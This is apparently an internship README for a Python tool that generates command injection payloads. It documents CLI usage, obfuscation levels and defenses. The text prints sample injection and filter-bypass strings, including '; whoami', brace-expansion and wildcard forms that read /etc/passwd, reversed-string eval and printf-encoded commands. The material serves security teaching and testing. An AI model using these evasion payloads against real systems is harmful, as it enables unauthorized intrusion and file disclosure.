# Command Injection Payload Generation Framework

**Version:** 1.0.0  
**Purpose:** Educational security research and authorized penetration testing  
**Author:** Security Research Team

---

## ⚠️ ETHICAL DISCLAIMER

This tool is developed **strictly** for:
- ✅ Educational purposes and security training
- ✅ Authorized penetration testing in controlled environments
- ✅ Defensive research and security analysis
- ✅ CTF challenges and cybersecurity labs

**UNAUTHORIZED USE IS PROHIBITED AND MAY BE ILLEGAL**

By using this tool, you acknowledge that:
1. You have explicit permission to test target systems
2. Unauthorized access to computer systems is illegal
3. The authors assume NO LIABILITY for misuse
4. You will comply with all applicable laws and regulations

Aligned with:
- [OWASP Code of Ethics](https://owasp.org/www-project-code-of-ethics/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Architecture](#architecture)
- [Usage](#usage)
- [Modules](#modules)
- [Examples](#examples)
- [Advanced Techniques](#advanced-techniques)
- [Defense Analysis](#defense-analysis)
- [Contributing](#contributing)
- [License](#license)

---

## 🎯 Overview

This framework generates command injection payload **templates** (not live attacks) for educational purposes. It demonstrates:

- How attackers exploit command injection vulnerabilities
- Common filter bypass techniques
- Why blacklist-based defenses fail
- How modern security controls detect/prevent attacks
- Proper defensive strategies

**Key Point:** This tool generates **templates and explanations**, not executable attack code.

---

## ✨ Features

### Core Capabilities

- **Multi-OS Support:** Linux and Windows payload templates
- **Categorized Payloads:** Basic, blind, advanced, and filter bypass techniques
- **Standard Obfuscation:** URL encoding, Base64, hex, quote injection, wildcards
- **Advanced Techniques:**
  - 🔥 **Brace Expansion Abuse** - Execute without separators
  - 🔥 **String Reversal** - Runtime payload reconstruction
  - 🔥 **Arithmetic Expansion** - Dynamic character generation
- **Defense Analysis:** Explains why payloads work and how to defend
- **Multiple Output Formats:** CLI, JSON (Burp Suite), TXT catalog
- **Educational Focus:** Every payload includes explanations

### Obfuscation Techniques

| Category | Techniques | Evasion Level |
|----------|------------|---------------|
| **Encoding** | URL, Base64, Hex, Unicode | Low-Medium |
| **Character** | Quote injection, backslash escape, variables | Medium |
| **Space Bypass** | IFS, redirection, brace expansion | High |
| **Path Obfuscation** | Wildcards, variable expansion | High |
| **Advanced** | Brace expansion, reversal, arithmetic | Very High |

---

## 📦 Installation

### Requirements

- Python 3.7+
- No external dependencies (uses standard library only)

### Setup

```bash
# Clone or download the module
cd command_injection_module

# Make executable
chmod +x ci_module.py

# Run
python3 ci_module.py --help
```

---

## 🏗️ Architecture

The framework consists of four main modules:

```
ci_module.py                    # Main CLI interface
├── ci_payloads.py             # Base payload templates database
├── ci_obfuscation.py          # Standard obfuscation techniques
├── ci_advanced_obfuscation.py # Advanced evasion (brace, reversal, arithmetic)
└── ci_signatures.py           # Defense signatures and analysis
```

### Module Responsibilities

#### `ci_payloads.py`
- **Purpose:** Payload template library
- **Contains:** 
  - OS-specific command separators
  - Categorized injection patterns
  - Context-aware payloads
  - Educational annotations

#### `ci_obfuscation.py`
- **Purpose:** Standard bypass techniques
- **Implements:**
  - Encoding (URL, Base64, Hex)
  - Character obfuscation (quotes, backslash)
  - Space bypasses (IFS, redirection)
  - Wildcard abuse
  - Technique chaining

#### `ci_advanced_obfuscation.py`
- **Purpose:** Sophisticated evasion methods
- **Implements:**
  - **Brace Expansion** (5 complexity levels)
  - **String Reversal** (5 complexity levels)
  - **Arithmetic Expansion** (5 complexity levels)
  - Ultimate combination techniques

#### `ci_signatures.py`
- **Purpose:** Defense knowledge base
- **Contains:**
  - Common filter patterns
  - Detection regex signatures
  - WAF bypass analysis
  - Defense recommendations

---

## 🚀 Usage

### Basic Commands

```bash
# Show help
python ci_module.py --help

# List available categories
python ci_module.py --list-categories

# List obfuscation techniques
python ci_module.py --list-techniques

# Show usage examples
python ci_module.py --examples
```

### Generating Payloads

```bash
# Basic Linux payloads
python ci_module.py --os linux --category basic

# Windows payloads with URL encoding
python ci_module.py --os windows --category basic --encode url

# Filter bypass techniques
python ci_module.py --os linux --category filter_bypass

# All categories
python ci_module.py --os linux --category all
```

### Advanced Techniques

```bash
# Brace expansion (Level 1)
python ci_module.py --os linux --advanced --technique brace --complexity 1

# String reversal (Level 4 - with Base64)
python ci_module.py --os linux --advanced --technique reverse --complexity 4

# Arithmetic expansion (Level 3)
python ci_module.py --os linux --advanced --technique arithmetic --complexity 3
```

### Output Formats

```bash
# JSON export (for Burp Suite)
python ci_module.py --os linux --category basic --output json --file payloads.json

# Text catalog
python ci_module.py --os linux --category all --output txt --file catalog.txt

# All formats
python ci_module.py --os linux --category advanced --output all
```

### With Analysis

```bash
# Show detailed explanations
python ci_module.py --os linux --category basic --explain

# Include defense recommendations
python ci_module.py --os linux --category basic --explain --defense
```

---

## 📚 Modules

### Module 1: ci_payloads.py

**Base Payload Templates**

Categories:
- `basic` - Simple separator-based injections
- `blind` - Time-based and out-of-band detection
- `advanced` - System enumeration and file access
- `filter_bypass` - Evasion techniques

Example payload structure:
```python
{
    'id': 'linux_basic_001',
    'payload': '; whoami',
    'description': 'Simple semicolon separator with whoami',
    'context': 'parameter',
    'risk': 'high',
    'detection': 'easy'
}
```

### Module 2: ci_obfuscation.py

**Standard Obfuscation Techniques**

Key methods:
- `url_encode()` - Single/double URL encoding
- `base64_encode()` - Base64 with shell wrapper
- `quote_injection()` - Break keyword matching
- `space_to_ifs()` - IFS variable space bypass
- `wildcard_path()` - Glob pattern obfuscation
- `chain_techniques()` - Multi-layer obfuscation

### Module 3: ci_advanced_obfuscation.py

**Advanced Evasion Techniques**

#### Brace Expansion
```bash
# Level 1: Basic
cat /etc/passwd → {cat,/etc/passwd}

# Level 4: Wildcard combo
cat /etc/passwd → {cat,/e??/p*wd}
```

#### String Reversal
```bash
# Level 1: Simple
cat → rev<<<'tac'

# Level 4: Base64 + Reversal
cat → echo [BASE64]|base64 -d|rev
```

#### Arithmetic Expansion
```bash
# Level 1: Hex ASCII
cat → $(printf "\x63\x61\x74")

# Level 4: Bitwise construction
w → $(printf %o $((1<<6))+$((1<<5))+...)
```

### Module 4: ci_signatures.py

**Defense Analysis**

Features:
- Payload risk assessment
- Detection probability scoring
- Bypass technique identification
- Defense recommendations
- WAF evasion analysis

---

## 💡 Examples

### Example 1: Basic Injection

```bash
python ci_module.py --os linux --category basic
```

Output:
```
[TEMPLATE] Command Injection Payload
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Payload ID: linux_basic_001
Base Payload: ; whoami
Description: Simple semicolon separator with whoami command
Context: parameter
Risk Level: HIGH
```

### Example 2: URL Encoded Payload

```bash
python ci_module.py --os linux --category basic --encode url
```

Output shows both original and encoded versions with bypass explanation.

### Example 3: Advanced Brace Expansion

```bash
python ci_module.py --os linux --advanced --technique brace --complexity 4
```

Generates brace expansion with wildcard combination:
```
Original: cat /etc/passwd
Obfuscated: {cat,/e??/p*wd}
Bypasses: Separator filters, Path blacklists
```

### Example 4: JSON Export for Burp Suite

```bash
python ci_module.py --os linux --category filter_bypass --output json --file burp_payloads.json
```

Creates JSON file ready for import into Burp Intruder.

### Example 5: Complete Analysis

```bash
python ci_module.py --os linux --category advanced --explain --defense
```

Includes:
- Payload details
- Obfuscation techniques
- Detection analysis
- Defense recommendations

---

## 🔥 Advanced Techniques

### Brace Expansion Abuse

**What it is:** Valid bash syntax that executes commands without separators

**Why it works:** Bypasses filters looking for `;`, `&&`, `||`, `|`

**Levels:**
1. **Basic:** `{cat,/etc/passwd}`
2. **Nested:** `{{cat,/etc/passwd}}`
3. **Chained:** `{whoami;id;pwd}`
4. **Wildcard:** `{cat,/e??/p*wd}`
5. **Variable:** `v0=c;v1=a;{$v0$v1t,/etc/passwd}`

**Defense:**
- Parse shell AST
- Detect brace patterns
- Reject complex expansions

### String Reversal

**What it is:** Reverse payload strings, reconstruct at runtime

**Why it works:** Signature doesn't exist until execution

**Levels:**
1. **rev command:** `rev<<<'dwssap/cte/ tac'`
2. **Parameter expansion:** `eval "$(echo 'tac'|rev)"`
3. **Character-by-char:** `p='cat';${p:2:1}${p:1:1}${p:0:1}`
4. **Base64 combo:** `echo [BASE64]|base64 -d|rev`
5. **Printf loops:** Manual reconstruction without rev

**Defense:**
- Flag rev usage
- Monitor eval patterns
- Runtime behavior analysis

### Arithmetic Expansion

**What it is:** Generate characters via math operations

**Why it works:** Command constructed dynamically

**Levels:**
1. **Hex ASCII:** `$(printf "\x63\x61\x74")`
2. **Octal:** `$(printf "\143\141\164")`
3. **Nested arithmetic:** `$(printf "\$(printf %o 99)")`
4. **Bitwise:** `$((1<<6))+$((1<<5))...`
5. **XOR:** Polymorphic with XOR key

**Defense:**
- Restrict arithmetic expansion
- Sandbox printf usage
- Only runtime analysis can detect

---

## 🛡️ Defense Analysis

### Why Blacklists Fail

**Problem:** Infinite bypass variations exist

**Examples:**
- `cat` → `c''at`, `c\at`, `/b??/c?t`, `$(printf "\x63at")`
- `/etc/passwd` → `/e??/p*wd`, `/e$u'tc'/passwd`
- `;` → `%3B`, `{command,args}`, brace expansion

### Modern Defense Strategies

#### 1. **Don't Use Shell** (Best)
```python
# ✅ GOOD - No shell injection possible
subprocess.run(["ping", "-c", "1", user_ip], shell=False)

# ❌ BAD - Vulnerable
os.system(f"ping -c 1 {user_ip}")
```

#### 2. **Whitelist Validation** (If shell unavoidable)
```python
# Only allow alphanumeric + specific safe chars
import re
if not re.match(r'^[a-zA-Z0-9._-]+$', user_input):
    raise ValueError("Invalid input")
```

#### 3. **AST Parsing**
- Parse input as shell would
- Detect dangerous syntax
- Reject complex constructs

#### 4. **Sandboxing**
- Containers with limited capabilities
- Drop privileges
- Restricted shells

#### 5. **Behavioral Monitoring**
- Log all executions
- Alert on unusual spawning
- Anomaly detection

---

## 🎓 Educational Value

This framework teaches:

### For Offensive Security
- How command injection works
- Filter bypass techniques
- Evasion methodology
- Tool development

### For Defensive Security
- Why blacklists fail
- How attackers think
- Detection strategies
- Proper defenses

### For Both
- Shell metacharacter behavior
- OS command differences
- Security control limitations
- Defense-in-depth principles

---

## 📝 Output Formats

### CLI Format
Human-readable with colors and formatting

### JSON Format
```json
{
  "tool": "Command Injection Module",
  "version": "1.0.0",
  "payloads": [
    {
      "id": "linux_basic_001",
      "payload": "; whoami",
      "obfuscation": {...},
      "analysis": {...}
    }
  ]
}
```

### TXT Catalog
Plain text listing of all payloads for reference

---

## 🤝 Contributing

This is an educational tool for a specific internship task. However, feedback and suggestions are welcome!

### Areas for Enhancement
- Additional OS support (macOS, BSD)
- More obfuscation techniques
- Enhanced detection analysis
- Additional output formats
- GUI interface

---

## 📖 References

### OWASP Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Code of Ethics](https://owasp.org/www-project-code-of-ethics/)

### Research & Learning
- [PortSwigger Web Security](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (Reference)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) (Inspiration)

---

## 📄 License

**Educational Use Only**

This tool is provided for educational purposes and authorized security testing only. The authors:

- Do NOT authorize unauthorized use
- Assume NO LIABILITY for misuse
- Encourage responsible disclosure
- Support ethical security research

---

## 👤 Author

**Security Research Team**  
Internship Task for: ITSOLERA (PVT) LTD  
Task: Offensive Security Tool Development – Payload Generation Framework

---

## ✅ Task Completion Checklist

- [x] Core tool requirements (Python CLI)
- [x] XSS Module (Not included - Command Injection focus)
- [x] SQL Injection Module (Not included - Command Injection focus)
- [x] **Command Injection Module** ✅
  - [x] Pattern-based payload generation
  - [x] OS detection logic (Linux/Windows)
  - [x] Command separators as strings
  - [x] Filter failure explanations
  - [x] Commands disabled by default
  - [x] Clearly marked as examples
- [x] Advanced features
  - [x] Encoding demonstrations (URL, Base64, Hex)
  - [x] Obfuscation logic (multiple techniques)
  - [x] Output formats (CLI, JSON, TXT)
- [x] Usability
  - [x] CLI flags and help menu
  - [x] Well-documented README
- [x] Bonus features
  - [x] Burp Suite integration (JSON export)
  - [x] Defensive analysis notes
  - [x] WAF bypass research
- [x] Ethical disclaimer included
- [x] OWASP alignment

---

## 🎯 Summary

This Command Injection Module provides:

✅ **Educational Focus:** Learn attack patterns and defenses  
✅ **Comprehensive Coverage:** 40+ payload templates  
✅ **Advanced Techniques:** Brace expansion, reversal, arithmetic  
✅ **Defense Analysis:** Understand detection and prevention  
✅ **Professional Quality:** Clean code, documentation, ethics  

**Perfect for:** Security training, CTF prep, defensive research, academic learning

**Remember:** 🔒 **Authorized testing environments only!**

---

*Generated for ITSOLERA Cyber Department - Winter Internship Task 2*
